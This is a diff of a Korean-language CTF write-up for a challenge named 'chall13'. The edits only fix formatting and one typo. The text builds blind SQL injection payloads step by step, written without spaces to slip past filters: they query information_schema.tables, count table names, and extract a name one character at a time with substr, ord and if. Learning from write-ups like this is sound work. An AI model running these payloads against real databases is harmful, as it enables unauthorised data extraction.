@@ -146,11 +146,11 @@ __SELECT(if((table_schema)in("chall13"),table_name,0))FROM(information_schema.ta
 
 ![vmware_owpSQlVbmc](https://user-images.githubusercontent.com/79683414/146135742-8098a1db-22dd-4d55-805e-72f1dcbe7afb.png)
 
-테스트를 위해 실제로 입력하면 위와 같은 결과가 나온다. 개수를 세기 위해 count 를 쿼리에 추가해주자. 괄호의 위치 주의해야한다.
+테스트를 위해 실제로 입력하면 위와 같은 결과가 나온다. 개수를 세기 위해 count 를 쿼리에 추가해주자. 괄호의 위치를 주의해야한다.
 
 <br>
 
-SELECT__(count__(if((table_schema)in("chall13"),table_name,0))__)__FROM(information_schema.tables);
+SELECT __(count__ (if((table_schema)in("chall13"),table_name,0)) __)__ FROM(information_schema.tables);
 
 <br>
 
@@ -158,7 +158,7 @@ SELECT__(count__(if((table_schema)in("chall13"),table_name,0))__)__FROM(informat
 
 0까지 모두 Count 되기 때문에 193 이라는 결과가 나왔다. 그렇다면 if 문에서 0 을 null 로 바꿔주자.
 
-SELECT(count(if((table_schema)in("chall13"),table_name,__null__)))FROM(information_schema.tables);
+SELECT(count(if((table_schema)in("chall13"),table_name, __null__ )))FROM(information_schema.tables);
 
 <br>
 
@@ -228,29 +228,29 @@ SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_sc
 
 _괄호_
 
-__(__SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)__)__
+__(__ SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables) __)__
 
 <br>
 
 _substr_
 
-__substr(__SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)__)__
+__substr(__ SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables) __)__
 
 <br>
 
 _ord, in_
 
-__ord(__substr(SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables))__)in(<입력>)__
+__ord(__ substr(SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)) __)in(<입력>)__
 
 <br>
 
 _if_
 
-__if(__ord(substr(SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)))in(<입력>)__,1,0)__
+__if(__ ord(substr(SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)))in(<입력>) __,1,0)__
 
 <br>
 
-완성
+_완성_
 
 __if(ord(substr((SELECT(min(if((table_schema)in(database()),table_name,null)))FROM(information_schema.tables)),1,1))in(102),1,0)__
 
